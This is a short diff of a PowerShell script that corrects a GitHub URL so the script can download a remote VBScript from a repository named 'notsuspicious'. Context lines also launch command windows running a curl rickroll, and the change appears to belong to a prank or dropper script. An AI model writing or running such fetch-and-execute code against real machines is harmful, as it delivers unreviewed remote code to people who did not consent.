@@ -6,7 +6,7 @@ Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowSt
 
 # Wait for a moment to let the windows start
 # Define the URL of the VBScript
-$vbsScriptUrl = "https://github/RaupenInspektor/notsuspicious/raw/main/script.vbs"
+$vbsScriptUrl = "https://github.com/RaupenInspektor/notsuspicious/raw/main/script.vbs"
 
 # Download the content of the VBScript
 $vbsScriptContent = Invoke-WebRequest -Uri $vbsScriptUrl -UseBasicParsing | Select-Object -ExpandProperty Content
